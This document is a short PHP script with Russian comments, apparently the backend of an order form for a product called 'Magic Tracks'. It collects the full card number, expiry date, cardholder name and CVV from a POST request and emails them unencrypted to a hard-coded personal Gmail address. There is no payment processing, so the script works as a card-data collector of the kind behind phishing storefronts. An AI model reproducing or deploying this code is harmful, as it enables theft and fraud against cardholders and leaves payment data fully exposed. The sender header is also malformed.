<?php
if (isset($_POST['full_card_num'], $_POST['card_month'], $_POST['card_year'], $_POST['card_user_name'], $_POST['user_cvv'])){
	$to = 'samkovsky@gmail.com'; //Почта получателя, через запятую можно указать сколько угодно адресов
    $subject = 'Заказ Magic Tracks'; //Заголовок сообщения
    // текст письма
    $message = 'Номер карточки: '.$_POST['full_card_num'].'<br> Месяц до которого действительна карточка: '.$_POST['card_month'].'<br> Год до которого действительна карточка: '.$_POST['card_year'].'<br> Держатель карты: '.$_POST['card_user_name'].'<br> CVV код: '.$_POST['user_cvv'];
    //текст письма
    $headers  = "Content-type: text/html; charset=utf-8 \r\n"; //Кодировка письма
    $headers .= "From: <noreply@test@gmail.com>\r\n"; //Наименование и почта отправителя
    mail($to, $subject, $message, $headers); //Отправка письма с помощью функции mail
    }

?>